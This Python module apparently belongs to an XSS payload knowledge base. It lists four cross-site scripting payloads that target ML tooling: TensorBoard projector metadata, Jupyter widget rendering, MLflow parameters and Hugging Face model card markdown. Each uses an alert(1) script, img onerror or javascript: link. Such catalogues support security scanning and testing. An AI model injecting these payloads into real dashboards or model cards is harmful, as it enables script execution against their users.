#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Deep Learning Visualizer Payloads
"""

from ..models import PayloadEntry

DEEP_LEARNING_PAYLOADS = {
    "tensorboard_projector_metadata": PayloadEntry(
        payload="metadata\t<script>alert(1)</script>\tlabel",
        contexts=["csv_injection", "tensorboard"],
        severity="high",
        cvss_score=7.5,
        description="XSS in TensorBoard Embedding Projector TSV",
        tags=["ai", "tensorboard", "tsv", "metadata"],
        reliability="medium",
        attack_surface="file-export"
    ),
    "jupyter_widget_xss": PayloadEntry(
        payload="application/vnd.jupyter.widget-view+json",
        contexts=["json", "jupyter"],
        severity="high",
        cvss_score=8.0,
        description="MIME type confusion in Jupyter widget rendering",
        tags=["ai", "jupyter", "mime", "widget"],
        reliability="low",
        attack_surface="web"
    ),
    "mlflow_param_injection": PayloadEntry(
        payload="<img src=x onerror=alert(1)>",
        contexts=["html_content", "mlflow"],
        severity="medium",
        cvss_score=6.1,
        description="XSS in MLflow experiment parameters",
        tags=["ai", "mlflow", "parameter"],
        reliability="high",
        attack_surface="web"
    ),
    "model_card_markdown": PayloadEntry(
        payload="[See Model Details](javascript:alert(1))",
        contexts=["markdown", "huggingface"],
        severity="medium",
        cvss_score=5.5,
        description="Malicious link in Model Card Markdown",
        tags=["ai", "model-card", "markdown", "javascript-uri"],
        reliability="high",
        attack_surface="web"
    )
}

DEEP_LEARNING_TOTAL = len(DEEP_LEARNING_PAYLOADS)
